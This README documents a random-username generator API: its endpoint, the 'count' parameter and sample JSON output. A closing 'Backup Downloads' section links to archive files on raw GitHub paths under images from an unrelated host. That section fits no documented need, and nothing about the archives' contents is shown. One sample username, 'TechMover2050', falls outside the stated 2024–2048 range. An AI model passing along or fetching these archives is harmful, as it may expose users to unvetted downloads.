

# Random Username Generator API

Welcome to the Random Username Generator API, your go-to tool for generating unique and creative usernames effortlessly!

### Base URL

The base URL for all API endpoints is: **https://usernameapiv1.vercel.app/**

### Endpoint

#### Generate Random Usernames

- **URL:** `/api/random-usernames`
- **Method:** GET

#### Description

This endpoint generates random usernames by combining a prefix, a suffix, and a randomly selected ending ("2048", a random number between 2024 and 2048, or an underscore "_").

#### Parameters

- **count** (optional): Specifies the number of usernames to generate. Defaults to 1 if not provided.

#### Example Usage

Generate a single random username:

```http
GET https://usernameapiv1.vercel.app/api/random-usernames
```

Response:

```json
{
  "usernames": [
    "QuantumMaster2048"
  ]
}
```

Generate multiple random usernames:

```http
GET https://usernameapiv1.vercel.app/api/random-usernames?count=5
```

Response:

```json
{
  "usernames": [
    "StardustWolf_",
    "LunaEnigma2048",
    "CosmicPirate2032",
    "DeltaSeeker_",
    "TechMover2050"
  ]
}
```

### Error Handling

- If the `count` parameter is not a valid number or is missing, the API defaults to generating 1 username.
- For any server errors or issues during generation, appropriate HTTP status codes and error messages will be returned in the response.

### CORS Policy

Cross-Origin Resource Sharing (CORS) is enabled to allow requests from different origins.

### Deployment Information

This API is powered by Vercel for serverless deployment of Node.js applications, ensuring reliability and scalability.

---

Feel free to explore and integrate this API into your applications to generate unique usernames for your users or projects. If you have any questions or feedback, please don't hesitate to reach out!

---
# Backup Downloads

**Zip(.zip)**: [![Download Random Username API](https://lelbois.nekoweb.org/download.svg)](https://github.com/randomusernameapi/randomusernameapi.github.io/raw/main/random-username-api.zip)

**Tarball(.tar.gz)**: [![Download Random Username API](https://lelbois.nekoweb.org/download.svg)](https://github.com/randomusernameapi/randomusernameapi.github.io/raw/main/archive.tar.gz)

**7Zip(.7z.gz)**: [![Download Random Username API](https://lelbois.nekoweb.org/download.svg)]((https://github.com/randomusernameapi/randomusernameapi.github.io/raw/main/random-username-api.7z.gz))
